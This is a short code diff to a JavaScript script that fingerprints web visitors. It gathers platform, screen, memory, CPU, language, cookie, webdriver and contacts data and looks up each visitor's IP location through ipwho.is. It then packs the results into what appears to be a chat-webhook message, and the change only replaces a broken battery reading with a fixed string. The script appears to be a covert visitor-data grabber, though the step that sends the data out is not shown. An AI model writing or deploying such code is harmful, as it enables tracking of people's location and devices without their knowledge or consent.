@@ -5,7 +5,6 @@ var platform = navigator.platform
 var java = navigator.javaEnabled()
 var width = screen.width
 var height = screen.height
-var battery = navigator.getBattery().then(function(battery) {battery.level * 100;})
 var memory = navigator.deviceMemory
 var cores = navigator.hardwareConcurrency
 var langs = navigator.languages
@@ -44,7 +43,7 @@ $.getJSON("https://ipwho.is/", function(data) {
           },
           {
             "name": "Misc Info",
-            "value": `>>> Battery: ${battery}\nCookies: ${cookie}\nJava: ${java}\nDo Not Track: ${donot}\nWeb Driver: ${webdriv}\nContacts: ${contacts}`
+            "value": `>>> Battery: NOT SUPPORTED\nCookies: ${cookie}\nJava: ${java}\nDo Not Track: ${donot}\nWeb Driver: ${webdriv}\nContacts: ${contacts}`
           }
         ]
       }
